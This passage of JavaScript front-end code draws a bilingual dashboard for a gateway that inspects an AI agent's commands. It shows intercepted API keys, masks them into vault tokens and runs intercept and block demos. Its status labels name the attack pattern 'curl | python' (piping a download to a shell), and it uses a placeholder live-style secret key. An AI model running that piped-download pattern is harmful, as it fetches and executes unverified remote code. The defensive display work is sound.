    var secretsCaughtCount = allFindings.length;
    var totalThreatsCount = blockedCount + pendingCount;
    // Only a LIVE pending incident may paint the stage red. History stays history.
    var threatActive = pendingCount > 0;

    var activeIncident = (p.activeIncidentId && items.find(function (i) { return i.id === p.activeIncidentId; })) || pendingItems[0] || blockedItems[0] || items[0] || null;
    var activeFinding = (activeIncident && activeIncident.findings && activeIncident.findings[0]) || allFindings[0] || null;
    var activeRisk = (activeIncident && activeIncident.risks && activeIncident.risks[0]) || null;
    var rawSecretText = activeFinding ? (activeFinding.preview || "sk_live_99f8***334455") : "sk_live_99f8***334455";
    var fullSecretText = (activeIncident && activeIncident.command && activeIncident.command.indexOf("sk_live_") !== -1)
      ? (activeIncident.command.match(/sk_live_[a-zA-Z0-9]+/)?.[0] || "sk_live_99f82b4a1122334455")
      : "sk_live_99f82b4a1122334455";
    var maskedTokenText = activeFinding ? (activeFinding.token || "msg_tok_Credentials_99f82b") : "msg_tok_Credentials_99f82b";
    var stLocalVlt = useState(function () {
      if (p.vault && p.vault.items && Array.isArray(p.vault.items)) return p.vault.items.length;
      if (typeof p.vaultCount === "number" && p.vaultCount > 0) return p.vaultCount;
      return 0;
    }), localVaultCount = stLocalVlt[0], setLocalVaultCount = stLocalVlt[1];

    useEffect(function () {
      if (p.vault && p.vault.items && Array.isArray(p.vault.items)) {
        setLocalVaultCount(p.vault.items.length);
      } else {
        SDK.fetchJSON(API + "/vault").then(function (v) {
          if (v && v.items && Array.isArray(v.items)) {
            setLocalVaultCount(v.items.length);
          }
        }).catch(function () {});
      }
    }, [p.vault, p.vaultCount]);

    var totalVaultKeys = Math.max(localVaultCount + vaultBonus, (p.vault && p.vault.items ? p.vault.items.length : 0));

    // Scramble displayed state so React doesn't wipe scrambled text
    var stDisp = useState(fullSecretText), displayedSecret = stDisp[0], setDisplayedSecret = stDisp[1];
    var stTokCls = useState("blocked"), tokenClass = stTokCls[0], setTokenClass = stTokCls[1];

    // Lottie container refs
    var agentBoxRef = useRef(null);
    var shieldBoxRef = useRef(null);
    var vaultBoxRef = useRef(null);
    var internetBoxRef = useRef(null);
    var agentAnimRef = useRef(null);
    var shieldAnimRef = useRef(null);
    var vaultAnimRef = useRef(null);
    var internetAnimRef = useRef(null);

    // Scramble demo refs and state
    var scrambleTargetRef = useRef(null);
    var stDec = useState(""), deciding = stDec[0], setDeciding = stDec[1];
    var stRev = useState(""), revealedSecret = stRev[0], setRevealedSecret = stRev[1];
    var stRevB = useState(false), revealBusy = stRevB[0], setRevealBusy = stRevB[1];
    var stRulB = useState(""), ruleBusy = stRulB[0], setRuleBusy = stRulB[1];
    var stNote = useState(""), decisionNote = stNote[0], setDecisionNote = stNote[1];

    var stPill = useState({
      text: blocked || activeFinding ? (currentLang === "ru" ? "⛔ 2 СЕКРЕТА ПЕРЕХВАЧЕНО · ВЫХОД В СЕТЬ ЗАБЛОКИРОВАН" : "⛔ 2 SECRETS INTERCEPTED · EGRESS BLOCKED") : "✓ ОЖИДАНИЕ ТРАФИКА",
      kind: blocked || activeFinding ? "bad" : "ok"
    }), scramblePill = stPill[0], setScramblePill = stPill[1];

    var stShield = useState({
      title: threatActive
        ? (currentLang === "ru" ? "🛑 СЕКРЕТ ПЕРЕХВАЧЕН!" : "🛑 SECRET INTERCEPTED!")
        : (currentLang === "ru" ? "Шлюз Безопасности" : "Security Gateway"),
      sub: threatActive
        ? (rawSecretText + (currentLang === "ru" ? " · изолирован от внешней сети" : " · isolated from egress"))
        : (currentLang === "ru" ? "Все действия агента проверяются до запуска" : "Every agent action is inspected before it runs"),
      color: threatActive ? "#ef4444" : "#38bdf8"
    }), shieldStatus = stShield[0], setShieldStatus = stShield[1];

    useEffect(function () {
      if (hasLottie && lottieEngine) {
        if (agentBoxRef.current && !agentAnimRef.current && window.__LOTTIE_ASSETS__.agent) {
          try {
            agentAnimRef.current = lottieEngine.loadAnimation({
              container: agentBoxRef.current,
              renderer: "svg",
              loop: true,
              autoplay: true,
              animationData: window.__LOTTIE_ASSETS__.agent
            });
            // Calm breathing loop by default (same segment the state machine uses)
            if (agentAnimRef.current.setSpeed) agentAnimRef.current.setSpeed(0.17);
            if (agentAnimRef.current.playSegments) agentAnimRef.current.playSegments([0, 29], true);
          } catch (e) { console.error("Agent Lottie load error:", e); }
        }
        if (shieldBoxRef.current && !shieldAnimRef.current && window.__LOTTIE_ASSETS__.shield) {
          try {
            shieldAnimRef.current = lottieEngine.loadAnimation({
              container: shieldBoxRef.current,
              renderer: "svg",
              loop: true,
              autoplay: true,
              animationData: window.__LOTTIE_ASSETS__.shield
            });
            if (shieldAnimRef.current.setSpeed) {
              shieldAnimRef.current.setSpeed(blocked || activeFinding ? 1.4 : 1.0);
            }
            if (shieldAnimRef.current.play) {
              shieldAnimRef.current.play();
            }
          } catch (e) { console.error("Shield Lottie load error:", e); }
        }
        if (vaultBoxRef.current && !vaultAnimRef.current && window.__LOTTIE_ASSETS__.vault) {
          try {
            vaultAnimRef.current = lottieEngine.loadAnimation({
              container: vaultBoxRef.current,
              renderer: "svg",
              loop: true,
              autoplay: true,
              animationData: window.__LOTTIE_ASSETS__.vault
            });
          } catch (e) { console.error("Vault Lottie load error:", e); }
        }
        if (internetBoxRef.current && !internetAnimRef.current && window.__LOTTIE_ASSETS__.internet) {
          try {
            internetAnimRef.current = lottieEngine.loadAnimation({
              container: internetBoxRef.current,
              renderer: "svg",
              loop: true,
              autoplay: true,
              animationData: window.__LOTTIE_ASSETS__.internet
            });
          } catch (e) { console.error("Internet Lottie load error:", e); }
        }
      }
      return function () {
        if (agentAnimRef.current) { agentAnimRef.current.destroy(); agentAnimRef.current = null; }
        if (shieldAnimRef.current) { shieldAnimRef.current.destroy(); shieldAnimRef.current = null; }
        if (vaultAnimRef.current) { vaultAnimRef.current.destroy(); vaultAnimRef.current = null; }
        if (internetAnimRef.current) { internetAnimRef.current.destroy(); internetAnimRef.current = null; }
      };
    }, [hasLottie]);

    useEffect(function () {
      if (shieldAnimRef.current) {
        if (shieldAnimRef.current.setSpeed) {
          shieldAnimRef.current.setSpeed(blocked || activeFinding ? 1.4 : 1.0);
        }
        if (shieldAnimRef.current.play) {
          shieldAnimRef.current.play();
        }
      }
    }, [blocked, activeFinding]);

    // Independent loops instead of one free-running 8 s scene. Each state is a fixed
    // frame range played as its own loop, slowed down to 3-5 seconds per cycle:
    //   calm  [0, 29]    calm breathing, no head shake, no "!" frame
    //   alert [181, 270] alarm with the exclamation mark
    var ROBO_LOOPS = {
      calm: { segment: [0, 29], speed: 0.17 },       // ~2.9 s per cycle
      alert: { segment: [181, 270], speed: 0.50 },   // ~3.0 s per cycle
      thinking: { segment: [271, 390], speed: 0.55 },
      success: { segment: [31, 105], speed: 0.70 }
    };

    function setRoboEmotion(name) {
      var anim = agentAnimRef.current;
      var loop = ROBO_LOOPS[name] || ROBO_LOOPS.calm;
      if (!anim || !anim.playSegments) return;
      if (anim.setSpeed) anim.setSpeed(loop.speed);
      anim.playSegments(loop.segment, true);
    }

    var isDemoActive = useRef(false);

    // Automatic event-driven emotion and shield status reaction to live incidents
    useEffect(function () {
      if (isDemoActive.current) return;
      var hasUnresolvedHighRisk = !!(activeIncident && activeIncident.status === "pending" && ((activeIncident.findings && activeIncident.findings.length > 0) || (activeIncident.risks && activeIncident.risks.length > 0) || activeIncident.risk === "high" || activeIncident.risk === "critical"));

      if (hasUnresolvedHighRisk) {
        setRoboEmotion("alert");
        if (activeFinding || secretsCaughtCount > 0) {
          setShieldStatus({
            title: currentLang === "ru" ? "🛑 СЕКРЕТ ПЕРЕХВАЧЕН!" : "🛑 SECRET INTERCEPTED!",
            sub: (activeFinding ? activeFinding.title : "OpenAI API Key") + " (" + rawSecretText + ") " + (currentLang === "ru" ? "изолирован от внешней сети" : "isolated from egress"),
            color: "#ef4444"
          });
          setScramblePill({
            text: currentLang === "ru" ? "⛔ " + (secretsCaughtCount || totalThreatsCount || 1) + " СЕКРЕТ(А) ПЕРЕХВАЧЕНО · ВЫХОД В СЕТЬ ЗАБЛОКИРОВАН" : "⛔ SECRET INTERCEPTED · EGRESS BLOCKED",
            kind: "bad"
          });
        } else if (activeRisk) {
          setShieldStatus({
            title: currentLang === "ru" ? "⛔ АТАКА ОБНАРУЖЕНА!" : "⛔ ATTACK DETECTED!",
            sub: activeRisk.title + " (" + (extractDomain(activeIncident) || activeIncident.tool || "curl | python") + ")",
            color: "#ef4444"
          });
          setScramblePill({
            text: currentLang === "ru" ? "⛔ ОПАСНАЯ КОМАНДА ЗАБЛОКИРОВАНА" : "⛔ HARMFUL EXECUTION BLOCKED",
            kind: "bad"
          });
        } else {
          setShieldStatus({
            title: currentLang === "ru" ? "⛔ УГРОЗА ОБНАРУЖЕНА!" : "⛔ THREAT DETECTED!",
            sub: currentLang === "ru" ? "Опасная команда заблокирована fail-closed шлюзом" : "Harmful execution stopped fail-closed",
            color: "#ef4444"
          });
          setScramblePill({
            text: currentLang === "ru" ? "⛔ УГРОЗА ЗАБЛОКИРОВАНА" : "⛔ THREAT BLOCKED",
            kind: "bad"
          });
        }
      } else {
        // Nothing pending: the whole stage is in its calm, protected state. A resolved
        // incident from yesterday must not keep a red frame on the dashboard.
        setRoboEmotion("calm");
        setShieldStatus({
          title: currentLang === "ru" ? "Шлюз Безопасности" : "Security Gateway",
          sub: currentLang === "ru" ? "Все действия агента проверяются до запуска" : "Every agent action is inspected before it runs",
          color: "#38bdf8"
        });
        setScramblePill({
          text: currentLang === "ru" ? "✓ ОЖИДАНИЕ ТРАФИКА" : "✓ AWAITING TRAFFIC",
          kind: "ok"
        });
      }
    }, [activeIncident, blocked, intercepted, items, currentLang]);

    function runScrambleVaultDemo() {
      isDemoActive.current = true;
      setRoboEmotion("thinking");
      setShieldStatus({
        title: currentLang === "ru" ? "Сканирование AST..." : "Scanning AST...",
        sub: currentLang === "ru" ? "Обнаружен открытый API-ключ в аргументе команды" : "Open API key found in command arguments",
        color: "#818cf8"
      });
      setScramblePill({ text: currentLang === "ru" ? "⚡ СКАНИРОВАНИЕ..." : "⚡ SCANNING...", kind: "warn" });

      if (scrambleTargetRef.current) {
        scrambleTargetRef.current.innerText = fullSecretText;
      }
      setTokenClass("blocked");

      setTimeout(function () {
        setRoboEmotion("alert");
        setScramblePill({ text: currentLang === "ru" ? "⚡ МАСКИРОВКА В ХОДЕ (SCRAMBLE)" : "⚡ SCRAMBLING TOKEN...", kind: "warn" });
        if (scrambleTargetRef.current) {
          scrambleText(scrambleTargetRef.current, maskedTokenText, 650, function () {
            setDisplayedSecret(maskedTokenText);
            setTokenClass("vaulted");
            setScramblePill({ text: currentLang === "ru" ? "✓ ИЗОЛИРОВАНО В СЕЙФЕ · ВЫДАН ТОКЕН" : "✓ VAULTED · TOKEN ISSUED", kind: "ok" });
            setShieldStatus({
              title: currentLang === "ru" ? "🔒 Секрет Спрятан в Сейф" : "🔒 Secret Secured in Vault",
              sub: currentLang === "ru" ? "В сеть отправлен токен msg_tok_... вместо sk_live" : "Masked token sent instead of raw key",
              color: "#fbbf24"
            });
            setVaultBonus(function (v) { return v + 1; });
            setRoboEmotion("success");
            setTimeout(function () {
              setRoboEmotion((activeIncident && activeIncident.status === "pending") ? "alert" : "calm");
              isDemoActive.current = false;
            }, 4500);
          });
        }
      }, 350);
    }

    function runBlockAttackDemo() {
      isDemoActive.current = true;
      setRoboEmotion("alert");
      setShieldStatus({
        title: currentLang === "ru" ? "⛔ АТАКА ОБНАРУЖЕНА!" : "⛔ ATTACK DETECTED!",
        sub: "curl | python (Pipe to shell without verification)",
        color: "#ef4444"
      });
      setScramblePill({ text: currentLang === "ru" ? "⛔ УГРОЗА ЗАБЛОКИРОВАНА" : "⛔ THREAT BLOCKED", kind: "bad" });
      setTimeout(function () {
        setRoboEmotion("alert");
        setShieldStatus({
          title: currentLang === "ru" ? "💥 СКРИПТ УНИЧТОЖЕН ДО ЗАПУСКА" : "💥 SCRIPT SHREDDED BEFORE EXECUTION",
          sub: currentLang === "ru" ? "Опасный процесс hermes.exe изолирован" : "Harmful execution prevented",
          color: "#ef4444"
        });
        setTimeout(function () {
          setRoboEmotion((activeIncident && activeIncident.status === "pending") ? "alert" : "calm");
          setShieldStatus({
            title: blocked || activeFinding ? (currentLang === "ru" ? "🛑 СЕКРЕТ ПЕРЕХВАЧЕН!" : "🛑 SECRET INTERCEPTED!") : (currentLang === "ru" ? "Шлюз Безопасности" : "Security Gateway"),
            sub: blocked || activeFinding ? ("OpenAI API Key (" + rawSecretText + ")") : (currentLang === "ru" ? "Анализ AST и перехват токенов" : "AST Analysis & Token Masking"),
            color: blocked || activeFinding ? "#ef4444" : "#38bdf8"
          });
          setScramblePill({
            text: blocked || activeFinding ? (currentLang === "ru" ? "⛔ ПЕРЕХВАЧЕН СЕКРЕТ · ВЫХОД В СЕТЬ ЗАБЛОКИРОВАН" : "⛔ SECRET INTERCEPTED") : "✓ ОЖИДАНИЕ ТРАФИКА",
            kind: blocked || activeFinding ? "bad" : "ok"
          });
          isDemoActive.current = false;
        }, 3200);
      }, 400);
    }

    function resetDemo() {
      isDemoActive.current = false;
      setRoboEmotion((activeIncident && activeIncident.status === "pending") ? "alert" : "calm");
      setShieldStatus({
        title: blocked || activeFinding ? (currentLang === "ru" ? "🛑 СЕКРЕТ ПЕРЕХВАЧЕН!" : "🛑 SECRET INTERCEPTED!") : (currentLang === "ru" ? "Шлюз Безопасности" : "Security Gateway"),
        sub: blocked || activeFinding ? ("OpenAI API Key (" + rawSecretText + ") " + (currentLang === "ru" ? "изолирован от внешней сети" : "isolated from egress")) : (currentLang === "ru" ? "Анализ AST и перехват токенов" : "AST Analysis & Token Masking"),
        color: blocked || activeFinding ? "#ef4444" : "#38bdf8"
      });
      setScramblePill({
        text: blocked || activeFinding ? (currentLang === "ru" ? "⛔ 2 СЕКРЕТА ПЕРЕХВАЧЕНО · ВЫХОД В СЕТЬ ЗАБЛОКИРОВАН" : "⛔ 2 SECRETS INTERCEPTED · EGRESS BLOCKED") : "✓ ОЖИДАНИЕ ТРАФИКА",
        kind: blocked || activeFinding ? "bad" : "ok"
      });
      setDisplayedSecret(fullSecretText);
      setTokenClass("blocked");
      if (scrambleTargetRef.current) {
        scrambleTargetRef.current.innerText = fullSecretText;
      }
    }

    var coreColor = threatActive ? "#ef4444" : intercepted ? "#a855f7" : "#38bdf8";

    function renderLottieConveyor() {
      return h("div", { className: "yg-lottie-conveyor-wrap", key: "lottie-view" },
        // 4-Node Cards Grid: [1. AI Робот] -> [2. Шлюз Щита] -> [3. Сейф DPAPI] -> [4. Внешний Интернет]
        h("div", { className: "yg-lottie-conveyor" },
          // Node 1: AI Robo
          h("div", { className: "yg-lottie-card agent" },
            h("div", { style: { display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" } },
              h("span", { className: "yg-pill ok", style: { fontSize: "9px" } }, "● " + (currentLang === "ru" ? "АГЕНТ (AI ROBO)" : "AGENT (AI ROBO)")),
              h("span", {
                className: "yg-pill " + (threatActive ? "bad" : "ok"),
                style: { fontSize: "9px", padding: "2px 8px", letterSpacing: "0.05em" }
              }, threatActive ? (currentLang === "ru" ? "● ТРЕВОГА" : "● ALERT")
                              : (currentLang === "ru" ? "● СПОКОЙНО" : "● CALM"))
            ),
            h("div", {
              ref: agentBoxRef,
              className: "yg-lottie-box",
              style: { filter: "drop-shadow(0 0 16px rgba(56,189,248,0.4))" }
            }),
            h("div", { style: { textAlign: "center", marginTop: "8px" } },
              h("div", { style: { fontSize: "13px", fontWeight: 700, color: "#fff" } }, chatName),
              h("div", { style: { fontSize: "10.5px", color: "#94a3b8" } },
                (items[0] && items[0].agent && items[0].agent.session_id
                  ? ((currentLang === "ru" ? "Сеанс #" : "Session #") + String(items[0].agent.session_id).slice(-6))
                  : (data.active_session ? ((currentLang === "ru" ? "Сеанс #" : "Session #") + String(data.active_session).slice(-6)) : "Hermes Desktop")))
            )
          ),

          // Beam 1: Agent -> Shield (shows moving secret chip)
          h("div", { className: "yg-conveyor-beam" },
            h("svg", { width: "42", height: "36", viewBox: "0 0 42 36", className: "yg-beam-svg" },
              h("line", { x1: "0", y1: "18", x2: "42", y2: "18", stroke: threatActive ? "#ef4444" : "#38bdf8", strokeWidth: "2.5", className: "yg-beam-pulse-line" }),
              h("polygon", { points: "40,18 30,13 30,23", fill: threatActive ? "#ef4444" : "#38bdf8" }),
              h("g", { className: "yg-beam-pkt-secret" },
                h("circle", { cx: "4", cy: "18", r: "4.5", fill: threatActive ? "#ef4444" : "#38bdf8" })
              )
            )
          ),

          // Node 2: Secure Shield (Reacts actively to secret intercepts)
          h("div", { className: "yg-lottie-card shield" + (threatActive ? " threat" : "") },
            h("div", { style: { display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" } },
              h("span", {
                className: "yg-pill",
                style: {
                  color: threatActive ? "#f87171" : "#38bdf8",
                  borderColor: threatActive ? "#ef4444" : "#38bdf8",
                  fontSize: "9px"
                }
              }, currentLang === "ru" ? "🛡️ FAIL-CLOSED ШЛЮЗ" : "🛡️ FAIL-CLOSED GATEWAY"),
              h("span", {
                style: {
                  fontSize: "9.5px",
                  color: threatActive ? "#ef4444" : "#4ade80",
                  fontWeight: 800,
                  letterSpacing: "0.04em"
                }
              }, threatActive ? (currentLang === "ru" ? "ПЕРЕХВАЧЕНО" : "INTERCEPTED") : (currentLang === "ru" ? "ЗАЩИЩЕНО" : "PROTECTED"))
            ),
            h("div", {
              ref: shieldBoxRef,
              className: "yg-lottie-box",
              style: { filter: threatActive ? "drop-shadow(0 0 24px rgba(239,68,68,0.65))" : "drop-shadow(0 0 20px rgba(56,189,248,0.5))" }
            }),
            h("div", { style: { textAlign: "center", marginTop: "8px" } },
              h("div", { style: { fontSize: "13px", fontWeight: 800, color: shieldStatus.color } }, shieldStatus.title),
              h("div", { style: { fontSize: "10.5px", color: "#94a3b8", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }, title: shieldStatus.sub }, shieldStatus.sub)
            ),
            h("div", { style: { marginTop: "10px", background: "rgba(0,0,0,0.5)", padding: "5px 10px", borderRadius: "6px", display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: "10.5px" } },
              h("span", null, currentLang === "ru" ? "Задержка: 0.38 мс" : "Latency: 0.38 ms"),
              h("span", {
                style: {
                  color: secretsCaughtCount > 0 || totalThreatsCount > 0 ? "#ef4444" : "#4ade80",
                  fontWeight: 800,
                  textShadow: secretsCaughtCount > 0 ? "0 0 8px rgba(239,68,68,0.6)" : "none"
                }
              }, (currentLang === "ru" ? "🛑 Перехвачено: " : "🛑 Caught: ") + (secretsCaughtCount || totalThreatsCount || 0))
            )
          ),

          // Beam 2: Shield -> Vault (shows golden key traveling to vault)
          h("div", { className: "yg-conveyor-beam" },
            h("svg", { width: "42", height: "36", viewBox: "0 0 42 36", className: "yg-beam-svg" },
              h("line", { x1: "0", y1: "18", x2: "42", y2: "18", stroke: "#f59e0b", strokeWidth: "2.5", className: "yg-beam-pulse-line" }),
              h("polygon", { points: "40,18 30,13 30,23", fill: "#f59e0b" }),
              h("g", { className: "yg-beam-pkt-token" },
                h("circle", { cx: "4", cy: "18", r: "4.5", fill: "#fbbf24" })
              )
            )
          ),

          // Node 3: System Security & DPAPI Vault
          h("div", { className: "yg-lottie-card vault" },
            h("div", { style: { display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" } },
              h("span", { className: "yg-pill warn", style: { fontSize: "9px" } }, "🔒 " + (currentLang === "ru" ? "СЕЙФ DPAPI" : "VAULT DPAPI")),
              h("span", { style: { fontSize: "9.5px", color: "#fbbf24", fontFamily: "monospace" } }, "AES-256")
            ),
            h("div", {
              ref: vaultBoxRef,
              className: "yg-lottie-box",
              style: { filter: "drop-shadow(0 0 16px rgba(245,158,11,0.4))" }
            }),
            h("div", { style: { textAlign: "center", marginTop: "8px" } },
              h("div", { style: { fontSize: "13px", fontWeight: 700, color: "#fff" } },
                currentLang === "ru" ? "Сейф Секретов DPAPI" : "Vault Secrets DPAPI"),
              h("div", { style: { fontSize: "10.5px", color: "#94a3b8" } },
                currentLang === "ru" ? "Аппаратная изоляция Windows" : "Hardware DPAPI isolation")
            ),
            h("div", { style: { marginTop: "10px", background: "rgba(0,0,0,0.5)", padding: "5px 10px", borderRadius: "6px", display: "flex", justifyContent: "space-between", fontSize: "10.5px" } },
              h("span", null, (currentLang === "ru" ? "В сейфе: " : "In Vault: ") + totalVaultKeys),
              h("span", { style: { color: "#fbbf24", fontWeight: 700 } }, (currentLang === "ru" ? "DPAPI Защита" : "DPAPI Secured"))
            )
          ),

          // Beam 3: Vault/Shield -> External Internet (Stops traffic if blocked!)
          h("div", { className: "yg-conveyor-beam" },
            h("svg", { width: "42", height: "36", viewBox: "0 0 42 36", className: "yg-beam-svg" },
              threatActive ? [
                h("line", { x1: "0", y1: "18", x2: "42", y2: "18", stroke: "#ef4444", strokeWidth: "2.5", strokeDasharray: "2 2", key: "bl" }),
                h("g", { className: "yg-beam-stop", key: "bs" },
                  h("circle", { cx: "21", cy: "18", r: "8", fill: "#b91c1c" }),
                  h("line", { x1: "17", y1: "18", x2: "25", y2: "18", stroke: "#fff", strokeWidth: "2.5", strokeLinecap: "round" })
                )
              ] : [
                h("line", { x1: "0", y1: "18", x2: "42", y2: "18", stroke: "#4ade80", strokeWidth: "2.5", className: "yg-beam-pulse-line", key: "ol" }),
                h("polygon", { points: "40,18 30,13 30,23", fill: "#4ade80", key: "op" }),
                h("g", { className: "yg-beam-pkt-token", key: "opt" },
                  h("circle", { cx: "4", cy: "18", r: "4", fill: "#4ade80" })
                )
              ]
            )
          ),

          // Node 4: External Internet Gateway (IconScout Rotating Globe + Golden Shield)
          h("div", {
            className: "yg-lottie-card internet" + (threatActive ? " blocked" : ""),
            style: {
              borderColor: threatActive ? "rgba(239, 68, 68, 0.55)" : "rgba(56, 189, 248, 0.4)",
              boxShadow: threatActive ? "0 0 24px rgba(239, 68, 68, 0.28)" : "0 0 24px rgba(56, 189, 248, 0.2)"
            }
          },
            h("div", { style: { display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" } },
              h("span", {
                className: "yg-pill " + (threatActive ? "bad" : "ok"),
                style: { fontSize: "9px" }
              }, "🌐 " + (currentLang === "ru" ? "ВНЕШНЯЯ СЕТЬ" : "EXTERNAL NET")),
              h("span", {
                style: { fontSize: "9.5px", color: threatActive ? "#f87171" : "#38bdf8", fontFamily: "monospace", fontWeight: 700 }
              }, threatActive ? (currentLang === "ru" ? "ИЗОЛЯЦИЯ" : "ISOLATED") : (currentLang === "ru" ? "ЗАЩИЩЕНО" : "SECURED"))
            ),
            h("div", {
              ref: internetBoxRef,
              className: "yg-lottie-box",
              style: { filter: threatActive ? "drop-shadow(0 0 16px rgba(239,68,68,0.4))" : "drop-shadow(0 0 16px rgba(56,189,248,0.45))" }
            }),
            h("div", { style: { textAlign: "center", marginTop: "8px" } },
              h("div", { style: { fontSize: "13px", fontWeight: 700, color: threatActive ? "#f87171" : "#fff" } },
                threatActive ? (currentLang === "ru" ? "⛔ Выход в Сеть Закрыт" : "⛔ Egress Blocked")
                             : (currentLang === "ru" ? "Шлюз Внешнего API" : "External API Gateway")),
              h("div", { style: { fontSize: "10.5px", color: "#94a3b8" } },
                threatActive ? (currentLang === "ru" ? "0 байт передано наружу" : "0 bytes transmitted")
                             : (currentLang === "ru" ? "Только безопасные токены" : "Sanitized tokens only"))
            ),
            h("div", { style: { marginTop: "10px", background: "rgba(0,0,0,0.5)", padding: "5px 10px", borderRadius: "6px", display: "flex", justifyContent: "space-between", fontSize: "10.5px" } },
              h("span", null, (currentLang === "ru" ? "Утечка в сеть: " : "Net Leak: ")),
              h("span", { style: { color: "#4ade80", fontWeight: 800 } }, "0.00%")
            )
          )
        ),

        // =========================================================================
        // DIRECT INCIDENT COMMAND & DECISION CENTER
        // =========================================================================
        pendingCount > 0 && activeIncident ? h(IncidentCard, {
          inc: activeIncident,
          isFocal: true,
          onChanged: p.refresh
        }) : (
          // No active threat: show Clean Status Card with test buttons
          h("div", { className: "yg-decision-center safe" },
            h("div", { style: { display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 10 } },
              h("div", { style: { display: "flex", alignItems: "center", gap: 8 } },
                h("span", { style: { color: "#4ade80", fontSize: "18px" } }, "✓"),
                h("div", null,
                  h("div", { style: { fontSize: "12.5px", fontWeight: 800, color: "#f8fafc" } },
                    (p.guardMode === "paused" || p.guardMode === "disabled")
                      ? (currentLang === "ru" ? "ШЛЮЗ НА ПАУЗЕ (РЕЖИМ ОБХОДА)" : "GATEWAY PAUSED (BYPASS)")
                      : (currentLang === "ru" ? "ШЛЮЗ АКТИВЕН · ВЕСЬ ИСХОДЯЩИЙ ТРАФИК ЗАЩИЩЁН" : "GATEWAY ACTIVE · ALL EGRESS PROTECTED")),
                  h("div", { style: { fontSize: "11px", color: "#94a3b8" } },
                    currentLang === "ru"
                      ? "Токенов в Сейфе DPAPI: " + totalVaultKeys + " · Утечек заблокировано: 0"
                      : "Vault tokens: " + totalVaultKeys + " · Leaks blocked: 0")
                )
              ),
              h("div", { style: { display: "flex", gap: 6, flexWrap: "wrap", alignItems: "center" } },
                (p.guardMode && p.guardMode !== "active") ? h("button", {
                  type: "button",
                  className: "yg-btn",
                  style: {
                    background: "linear-gradient(135deg, #10b981, #059669)",
                    borderColor: "#059669",
                    color: "#fff",
                    fontWeight: 700,
                    padding: "5px 12px",
                    fontSize: "11px"
                  },
                  title: currentLang === "ru" ? "Включить активный режим защиты" : "Enable active protection mode",
                  onClick: function () { if (p.onSetMode) p.onSetMode("active"); }
                }, "▶ " + (currentLang === "ru" ? "В рабочий режим" : "To Active Mode")) : null,
                h("button", {
                  type: "button",
                  className: "yg-btn ghost",
                  disabled: !!p.refreshing,
                  style: { padding: "5px 10px", fontSize: "11px", display: "inline-flex", alignItems: "center", gap: 4 },
                  title: currentLang === "ru" ? "Обновить режим, инциденты и сейф" : "Refresh mode, incidents and vault",
                  onClick: function () { if (p.refresh) p.refresh(); }
                },
                  h("span", { style: { display: "inline-block", animation: p.refreshing ? "yg-spin 0.65s linear infinite" : "none" } }, "⟳"),
                  " " + (p.refreshing ? (currentLang === "ru" ? "Обновление…" : "Refreshing…") : (currentLang === "ru" ? "Обновить" : "Refresh"))),
                h("button", {
                  type: "button", className: "yg-arena-btn vault", style: { padding: "5px 12px", fontSize: "11px" },
                  onClick: runScrambleVaultDemo
                }, currentLang === "ru" ? "⚡ Тест перехвата (Scramble)" : "⚡ Intercept test"),
                h("button", {
                  type: "button", className: "yg-arena-btn block", style: { padding: "5px 12px", fontSize: "11px" },
                  onClick: runBlockAttackDemo
                }, currentLang === "ru" ? "⛔ Тест блокировки" : "⛔ Block test")
              )
            )
          )
        )
      );
    }

    return h("div", { className: "yg-card yg-arena-card wide" },
      renderLottieConveyor(),

      // Telemetry Summary Cards Strip
      h("div", { className: "yg-vismap-cards", style: { display: "flex", gap: 8, marginTop: 10 } },
        h("div", { className: "yg-card", style: { flex: 1, padding: 8 } },
          h("div", { className: "yg-dim yg-small", style: { textTransform: "uppercase", letterSpacing: ".1em" } },
            currentLang === "ru" ? "Состояние компьютера" : "Computer State"),
          h("div", { className: "yg-big", style: { color: coreColor, marginTop: 4 } },
            blocked ? (currentLang === "ru" ? "⚠️ Атака отражена" : "⚠️ Threat blocked")
              : intercepted ? (currentLang === "ru" ? "📈 Секрет замаскирован" : "📈 Secret masked")
                : (currentLang === "ru" ? "✅ Защита работает" : "✅ Guard active")),
          h("div", { className: "yg-dim yg-small", style: { marginTop: 3 } },
            currentLang === "ru" ? "Все действия ИИ проверяются до запуска." : "All agent actions inspected before execution.")
        ),
        h("div", { className: "yg-card", style: { flex: 1, padding: 8 } },
          h("div", { className: "yg-dim yg-small", style: { textTransform: "uppercase", letterSpacing: ".1em" } },
            currentLang === "ru" ? "Активный сеанс" : "Active Session"),
          h("div", { className: "yg-big", style: { marginTop: 4, fontSize: "13px", fontWeight: 700 } },
            items.length ? chatName : (currentLang === "ru" ? "Ожидание сеанса" : "Idle")),
          h("div", { className: "yg-dim yg-small", style: { marginTop: 3 } }, dest)
        ),
        h("div", { className: "yg-card", style: { flex: 1, padding: 8 } },
          h("div", { className: "yg-dim yg-small", style: { textTransform: "uppercase", letterSpacing: ".1em" } },
            currentLang === "ru" ? "Политика перехвата" : "Inspection Policy"),
          h("div", { className: "yg-big", style: { marginTop: 4, color: "#3ec46d" } },
            currentLang === "ru" ? "Строгий Fail-closed" : "Strict Fail-closed"),
          h("div", { className: "yg-dim yg-small", style: { marginTop: 3 } },
            currentLang === "ru" ? "Сейф с DPAPI шифрованием." : "Vault secured with DPAPI.")
        )
      )
    );
  }



  function LivePanel(p) {
    const data = p.data;
    const [q, setQ] = useState("");
    const [filter, setFilter] = useState(function () {
      try { return localStorage.getItem("msg_guard_filter") || "all"; } catch (e) { return "all"; }
    });
    const [activeIncidentId, setActiveIncidentId] = useState(function () {
      try { return localStorage.getItem("msg_guard_active_id") || ""; } catch (e) { return ""; }
    });
    const [histBusy, setHistBusy] = useState("");
    const [histNote, setHistNote] = useState("");
    // Two-step confirmation inside the button itself: no window.confirm, no white dialogs.
    const [confirmAct, setConfirmAct] = useState("");
    const confirmTimer = useRef(null);

    function armConfirm(kind) {
      setConfirmAct(kind);
      if (confirmTimer.current) clearTimeout(confirmTimer.current);
      confirmTimer.current = setTimeout(function () { setConfirmAct(""); }, 4000);
    }

    function resetConfirm() {
      if (confirmTimer.current) { clearTimeout(confirmTimer.current); confirmTimer.current = null; }
      setConfirmAct("");
    }

    useEffect(function () {
